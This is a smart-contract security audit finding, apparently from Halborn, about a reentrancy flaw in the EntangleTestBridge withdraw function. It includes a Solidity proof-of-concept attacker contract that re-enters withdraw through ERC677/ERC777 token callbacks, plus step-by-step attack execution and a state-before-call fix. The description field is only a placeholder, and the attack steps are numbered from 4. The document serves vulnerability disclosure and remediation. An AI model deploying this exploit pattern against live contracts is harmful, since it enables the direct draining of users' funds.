---
tags:
  - lang/solidity
  - sector/dex
  - platform/halborn
  - has/poc
  - severity/high
  - vuln/reentrancy/single-function
  - impact/loss-of-funds/direct-drain
  - precondition/specific-token-type
  - novelty/known-pattern
  - misassumption/external-call-is-safe
  - fix/use-reentrancy-guard
  - trigger/reentrancy-callback
protocol: "[[Entangle Trillion]]"
auditors:
  - "[[Halborn]]"
report: "https://www.halborn.com/audits/entangle-labs/entangle-trillion"
genome:
  - "[[single-function]]"
  - "[[direct-drain]]"
  - "[[specific-token-type]]"
  - "[[known-pattern]]"
  - "[[reentrancy-guard]]"
---
# Re-entrancy causes draining of funds through withdraw & SwapTo Function of EntangleTestBridge Contract

- id: 51374
- impact: HIGH
- protocol: [[Entangle Trillion]]
- reporter: Halborn
- source: https://www.halborn.com/audits/entangle-labs/entangle-trillion

## Summary


This bug report describes a vulnerability in a smart contract called EntangleTestBridge. The contract is susceptible to a re-entrancy attack, which allows an attacker to withdraw more tokens than they should be allowed. The vulnerability is triggered when the contract receives tokens through the ERC677 or ERC777 interface, and the attacker can exploit this by repeatedly calling the vulnerable function. The report recommends restructuring the function to update the contract's internal state before performing external calls, which would prevent the attack. However, the issue has been marked as "Not Applicable" as the code-base is deprecated.

## Details

##### Description

Finding description placeholder

##### Proof of Concept

```
interface IERC677Receiver {
    function onTokenTransfer(address _sender, uint _value, bytes calldata _data) external;
}

interface IERC777TokensRecipient {
    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external;
}

contract AttackerContract is IERC677Receiver, IERC777TokensRecipient {
    EntangleTestBridge public victim;
    IERC20 public attackToken;

    constructor(address _victimAddress, address _tokenAddress) {
        victim = EntangleTestBridge(_victimAddress);
        attackToken = IERC20(_tokenAddress);
    }

    // Fallback function to initiate the attack
    function onTokenTransfer(address _sender, uint _value, bytes calldata _data) external override {
        // Re-entrancy attack logic
        victim.withdraw(attackToken, _value);
    }

    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external override {
        // Re-entrancy attack logic
        victim.withdraw(attackToken, amount);
    }

    function attack(uint256 amount) external {
        attackToken.transferFrom(msg.sender, address(victim), amount);
        // The callback from ERC677 or ERC777 token transfer will trigger the re-entrancy
    }
}
```

  

#### Attack Execution

4. **Initiate the Attack**: The attacker calls the `attack` function of the `AttackerContract` with the amount of tokens they wish to exploit. This function transfers ERC677/ERC777 tokens to the `EntangleTestBridge`, which triggers the `onTokenTransfer` or `tokensReceived` callback in `AttackerContract`.
5. **Callback and Re-entrancy**: The `onTokenTransfer` or `tokensReceived` function in `AttackerContract` is automatically called due to the token transfer, and it immediately invokes the vulnerable `withdraw` function in `EntangleTestBridge`, exploiting the re-entrancy vulnerability.
6. **Repeat Unauthorized Withdrawals**: The callback and re-entrant call to `withdraw` allow the attacker to withdraw more tokens than they should be allowed, exploiting the contract's flawed state management.

##### BVSS

[AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (7.5)](/bvss?q=AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:U)

##### Recommendation

Restructure the `withdraw` function to update the contract's internal state (`tokenStorage[address(token)] -= amount`) before performing the external call to `token.safeTransferFrom`. This change ensures that the contract's state is consistent even if a re-entrancy attack is attempted.

  

**Remediation Plan:** The issue is marked as “Not Applicable” due to the related code-base is deprecated.
